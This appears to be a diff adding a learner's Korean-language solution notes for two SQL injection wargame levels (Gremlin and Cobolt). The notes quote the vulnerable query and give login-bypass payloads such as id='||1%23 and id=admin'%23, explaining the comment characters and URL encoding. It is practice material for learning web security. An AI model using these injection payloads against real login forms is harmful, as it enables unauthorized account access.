@@ -1,0 +1,17 @@
+Gremlin 문제 
+<풀이 과정>
+$query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'" 이 부분에서 id와 pw 둘 다 참 이어야 함
+But, if($result['id']) solve("gremlin"); 여기서 아이디만 찾으면 됨
+id='or 1=1-- a :여기서 조건문이 바로 참을 성립하게 나타내기 위함임
+여기서 조금 더 줄일 수 있지 않을까 싶어서 더 줄여봄 or 을 ||로 바꾸고, 1=1은 1로 -- a는 #으로 할 수 있을 듯함
+※ id='||1# 으로 할 수 있지만, 이걸론 풀리지 않음 
+그래서 # 대신하여 %23으로 쓸 것임
+id='||1%23
+
+Cobolt 문제
+<풀이 과정>
+id가 admin일때 cobolt 해결
+처음 그냥 id와 pw를 각각 admin으로 설정하여 id=admin&pw=admin')or('1')=('1')-- a 라고 하였더니 관리자 권한이 아니어서 풀리지 않음
+id=admin'%23&pw=admin으로 한다면 id와 pw가 admin, 즉 관리자 권한이 생김
+그러나 pw는 주석 처리로 나둬도 되기에 id=admin'%23으로 해도 문제 풀림
+id=admin'%23
